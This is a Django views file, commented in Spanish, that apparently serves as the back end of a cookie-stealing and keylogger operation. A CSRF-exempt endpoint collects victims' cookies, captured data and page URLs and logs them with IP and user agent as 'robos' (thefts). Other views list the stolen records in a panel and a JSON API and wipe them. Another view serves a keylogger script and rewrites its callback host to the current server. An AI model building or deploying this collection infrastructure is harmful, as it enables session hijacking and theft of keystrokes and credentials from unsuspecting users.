from django.shortcuts import render
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import DatasAx
import json
import traceback
import sys

@csrf_exempt
def rcb_stl(request):
    try:
        if request.method == 'GET':
            # Obtener parámetros
            cookie = request.GET.get('cookie', 'No se envio cookie')
            data = request.GET.get('data', 'No se envió data')
            url_completa = request.GET.get('url', 'No se envió URL')
            
            # Imprimir en logs
            print('=' * 60)
            print(f'📥 Recibiendo datos:')
            print(f'  Cookie: {cookie[:50]}...' if len(cookie) > 50 else f'  Cookie: {cookie}')
            print(f'  Data: {data[:50]}...' if len(data) > 50 else f'  Data: {data}')
            print(f'  URL: {url_completa}')
            
            # Crear el registro
            rb = DatasAx.objects.create(
                ip=request.META.get('REMOTE_ADDR'),
                user_agent=request.META.get('HTTP_USER_AGENT', 'No especificado'),
                cookie=cookie,
                data=data,
                url_completa=url_completa
            )
            
            print(f'✅ Guardado exitosamente ID: {rb.id}')
            print('=' * 60)
            
            return HttpResponse('OK')
        
        return HttpResponse('Wrong Method', status=405)
    
    except Exception as e:
        # 👇 ESTO VA A MOSTRAR EL ERROR EN LA RESPUESTA
        error_detallado = traceback.format_exc()
        print('=' * 60)
        print('❌ ERROR EN rcb_stl:')
        print(error_detallado)
        print('=' * 60)
        
        # Devolver el error en la respuesta para verlo en el navegador
        return HttpResponse(
            f'❌ ERROR:\n\n'
            f'{str(e)}\n\n'
            f'Detalle completo:\n{error_detallado}',
            status=500
        )


def panel_h(request):
    try:
        stl = DatasAx.objects.all()
        context = {
            'robos': stl,
            'total': stl.count(),
        }
        return render(request, 'pnl.html', context)
    except Exception as e:
        error_detallado = traceback.format_exc()
        print('❌ ERROR en panel_h:')
        print(error_detallado)
        return HttpResponse(f'Error en panel: {str(e)}', status=500)


def index(request):
    try:
        total = DatasAx.objects.count()
        last_stl = DatasAx.objects.first()
        context = {
            'total': total,
            'last_stl': last_stl,
        }
        return render(request, 'index.html', context)
    except Exception as e:
        error_detallado = traceback.format_exc()
        print('❌ ERROR en index:')
        print(error_detallado)
        return HttpResponse(f'Error en index: {str(e)}', status=500)


def cln(request):
    if request.method == 'POST':
        try:
            DatasAx.objects.all().delete()
            return JsonResponse({'status': 'ok', 'message': 'Datos eliminados'})
        except Exception as e:
            error_detallado = traceback.format_exc()
            print('❌ ERROR en cln:')
            print(error_detallado)
            return JsonResponse({'status': 'error', 'message': str(e)}, status=500)
    return HttpResponse('Wrong method', status=405)


def api_stl(request):
    try:
        stls = DatasAx.objects.all().values()
        return JsonResponse(list(stls), safe=False)
    except Exception as e:
        error_detallado = traceback.format_exc()
        print('❌ ERROR en api_stl:')
        print(error_detallado)
        return JsonResponse({'error': str(e)}, status=500)
    
@csrf_exempt
def keylogger_js(request):
    """Sirve el archivo keylogger.js"""
    # Leer el archivo keylogger.js
    import os
    from pathlib import Path
    
    BASE_DIR = Path(__file__).resolve().parent.parent
    file_path = os.path.join(BASE_DIR, 'pnl_xa', 'templates', 'keylogger.js')
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Reemplazar la URL del servidor dinámicamente
        servidor_url = request.build_absolute_uri('/').rstrip('/')
        content = content.replace('https://ax-mntt.onrender.com', servidor_url)
        
        return HttpResponse(content, content_type='application/javascript')
    except FileNotFoundError:
        return HttpResponse("// Keylogger no encontrado", content_type='application/javascript')